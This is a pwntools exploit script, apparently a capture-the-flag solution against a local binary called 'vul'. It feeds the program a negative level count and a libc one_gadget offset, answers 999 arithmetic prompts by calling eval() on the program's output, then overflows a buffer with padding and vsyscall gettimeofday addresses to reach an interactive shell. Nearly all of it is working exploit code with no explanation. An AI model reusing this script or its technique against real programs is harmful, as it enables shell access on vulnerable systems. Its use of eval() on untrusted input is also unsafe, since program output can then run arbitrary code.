#!/usr/bin/env python
from pwn import * 
p = process('./vul', env={'LD_PRELOAD':'./libc.so.6_64'})
libc_base = -0x456a0
one_gadget_base = 0x45526
vsyscall_gettimeofday = 0xffffffffff600000

def answer():
	p.recvuntil('Question: ') 
	answer = eval(p.recvuntil(' = ')[:-3])
	p.recvuntil('Answer:')
	p.sendline(str(answer))

p.recvuntil('Choice:')
p.sendline('2')
p.recvuntil('Choice:')
p.sendline('1')
p.recvuntil('How many levels?')
p.sendline('-1')
p.recvuntil('Any more?')
p.sendline(str(libc_base + one_gadget_base))
for i in range(999):
	log.info(i)
	answer()
p.recvuntil('Question: ')
p.send('A' * 0x38 + p64(vsyscall_gettimeofday) * 3)
p.interactive()
